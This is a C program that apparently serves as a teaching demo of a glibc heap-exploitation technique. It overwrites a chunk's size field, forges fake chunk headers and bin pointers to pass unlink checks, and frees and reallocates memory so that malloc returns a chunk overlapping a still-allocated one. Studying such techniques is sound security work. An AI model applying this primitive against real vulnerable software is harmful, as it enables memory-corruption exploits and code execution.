#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE 0x420
#define CHUNK_SIZE_HEADER_VALUE 0x431
#define CONSOLIDATED_SIZE 0x471

#define FAKE_CHUNK_PREV_SIZE 0x470
#define FAKE_CHUNK_SIZE 0x21

#define CHECK_CHUNK_PREV_SIZE 0x20
#define CHECK_CHUNK_SIZE 0x30

#define CONSOLIDATED_CHUNK_ALLOCATION_SIZE 0x480

void main() {
    long *chunk0,
            *chunk1,
            *chunk2,
            *consolidated_chunk,
            *consolidated_chunk_end;

    printf("So right now, we are going to try and consolidate a chunk we are freeing into an allocated chunk.\n");
    printf("This way, we can allocate a new chunk with malloc, that will overlap partially with another allocated heap chunk.\n");
    printf("Chunk consolidation happens, when under the right conditions, a malloc chunk is freed, and adjacent to another freed chunk.\n");
    printf("Malloc will merge the two smaller freed chunks into a single larger freed heap chunk.\n");
    printf("By consolidating a chunk into an existing freed chunk, with the right subsequent heap allocations, we can allocate the same heap space multiple times.\n");
    printf("Which can be helpful with a lot of heap pwning attacks.\n");
    printf("Right now, we will try to do forward consolidation, which means we are consolidating a newly freed chunk, with the chunk right after it in memory.\n");
    printf("Starting off, we will allocate three separate chunks.\n\n");

    chunk0 = malloc(CHUNK_SIZE);
    chunk1 = malloc(CHUNK_SIZE);
    chunk2 = malloc(0x80);

    printf("Chunk0:\t%p\n", chunk0);
    printf("Chunk1:\t%p\n", chunk1);
    printf("Chunk2:\t%p\n\n", chunk2);

    printf("We will be trying to forward consolidate Chunk1 (%p) into chunk2 (%p).\n\n", chunk1, chunk2);

    printf("So in order to do this, we will need to create several fake heap chunk headers.\n");
    printf("We will have to do more work than in previous libc versions, because of additional checks.\n\n");
    
    printf("First off, we will need to overwrite the size of Chunk1, so that it extends into Chunk2.\n");
    printf("I want the new consolidated chunk to extend 0x60 bytes into chunk2 (from 0x430 to 0x490).\n");
    printf("The first 0x40 bytes will come from expanding the chunk size of chunk1.\n");
    printf("The remaining 0x20 bytes will come from the fake chunk header we are consolidating into.\n");
    printf("So I will increase its size from 0x%x to 0x%x (prev_inuse flag set).\n\n", CHUNK_SIZE_HEADER_VALUE, CONSOLIDATED_SIZE);


    printf("Chunk1 old size:\t0x%lx\n", chunk1[-1]);
    chunk1[-1] = CONSOLIDATED_SIZE;
    printf("Chunk1 new size:\t0x%lx\n\n", chunk1[-1]);

    printf("Now after that, we will have to prepare the fake heap chunk header, for the fake heap chunk we will try to consolidate into.\n");
    printf("For this, there are 4 separate values we will need to set.\n");
    printf("The first two are the prev_size / chunk header size for the fake chunk.\n\n");
    
    printf("The prev_size will need to match the expanded size for chunk1, so it will be:\t0x%x\n", FAKE_CHUNK_PREV_SIZE);
    printf("The chunk header size will be 0x20, so we will expand the remaining 0x20 bytes.\n\n");

    chunk2[6] = FAKE_CHUNK_PREV_SIZE;
    chunk2[7] = FAKE_CHUNK_SIZE;

    printf("The remaining two values, will be the fwd/next ptrs for a libc main arena bin.\n");
    printf("As part of consolidation, it will expect the chunk we are consolidating into to be in a main arena bin.\n");
    printf("As such it will attempt to unlink the chunk from the bin, so we need to prepare for this.\n");
    printf("We will create a fake chunk in chunk0 (%p) with fwd/bk ptrs to our fake chunk (%p).\n", chunk0, &chunk2[6]);
    printf("And set our fwd/bk ptrs for our fake chunk to chunk0 (%p)\n\n", chunk0);

    chunk2[8] = ((long)chunk0);
    chunk2[9] = ((long)chunk0);

    printf("Now, we will create the fake libc main arena bin head chunk in chunk0.\n");
    printf("We will set the fwd/next ptrs to our fake chunk.\n\n");

    chunk0[2] = (long)&chunk2[6];
    chunk0[3] = (long)&chunk2[6];

    printf("There is one last fake header chunk we will need to create.\n");
    printf("We will need to create a fake chunk header, after the chunk we are consolidating into.\n");
    printf("This is for several reasons.\n");
    printf("First off, as part of forward consolidation, it will check (and update) the prev_size of the chunk after the chunk we are consolidating into.\n");
    printf("Secondly, as part of the malloc call where we will get the newly consolidated chunk, it will check the chunk size of the chunk after the consolidated fake chunk.\n");
    printf("So, we will need to set a prev_size, and chunk_size, that makes sense with the fake chunk that we created to consolidate into.\n");
    printf("For the prev_size, I choose 0x%x, to match the size of our fake chunk to consolidate into.\n", CHECK_CHUNK_PREV_SIZE);
    printf("For the chunk size, I choose 0x%x, to line up with the top chunk. While we don't strictly need to do this here, we can still fail certain checks if this chunk doesn't line up with another chunk.\n\n", CHECK_CHUNK_SIZE);

    chunk2[10] = CHECK_CHUNK_PREV_SIZE;
    chunk2[11] = CHECK_CHUNK_SIZE;

    printf("Now we will go ahead, and free chunk1, to cause fwd consolidation.\n\n");

    free(chunk1);

    printf("And now, we will reallocate chunk1, with a size of 0x%x.\n", CONSOLIDATED_CHUNK_ALLOCATION_SIZE);

    consolidated_chunk = malloc(CONSOLIDATED_CHUNK_ALLOCATION_SIZE);
    consolidated_chunk_end = consolidated_chunk + CONSOLIDATED_CHUNK_ALLOCATION_SIZE + 0x10;

    printf("Consolidated Chunk:\t%p\n", consolidated_chunk);
    printf("Consolidated Chunk End:\t%p\n", consolidated_chunk_end);
    printf("Chunk2 (still allocated):\t%p\n", chunk2);
    printf("Consolidate Chunk encompasses part of Chunk2:\t%s\n\n", ((consolidated_chunk < chunk2) && (chunk2 < consolidated_chunk_end)) ? "True" : "False");

    printf("Just like that, we were able to get malloc to allocate overlapping chunks via fwd consolidation!\n");
}
